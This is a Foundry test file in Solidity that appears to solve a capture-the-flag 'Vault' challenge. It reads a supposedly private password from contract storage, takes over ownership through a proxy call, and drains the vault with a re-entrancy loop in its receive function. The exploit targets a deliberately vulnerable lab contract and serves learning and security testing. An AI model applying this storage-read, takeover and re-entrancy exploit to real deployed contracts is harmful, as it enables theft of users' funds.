// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (this);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        console.log("VaultTest: ");
        // 1. Get the address of the VaultLogic contract
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        console.log("password: ");
        console.logBytes32(password);
        // 2. Call the changeOwner function of the VaultLogic contract to change the owner
        bytes4 selector = bytes4(keccak256("changeOwner(bytes32,address)")); 
        bytes memory data = abi.encodePacked(selector, password, uint256(uint160(palyer)));
        (bool result,) = address(vault).call(data);
        assert(vault.owner() == palyer);
        console2.log("owner change success: ", result);
        // 4. Call the openWithdraw function of the Vault contract to withdraw the funds

        vault.openWithdraw();
        console.log("canWithdraw: ", vault.canWithdraw());
        console.log("vault balance [before]: ", address(vault).balance);
        vault.deposite{ value: 0.01 ether }();
        // 5. Call the withdraw function of the Vault contract to withdraw all the funds by using re-entrancy method
        console.log("----attack begin----");
        vault.withdraw();
        require(vault.isSolve(), "solved");
        console.log("----attack end----");
        console.log("vault balance [after]: ", address(vault).balance);
        vm.stopPrank();
    }

    receive() external payable {
        console.log(address(vault).balance);
        vault.withdraw();
    }
}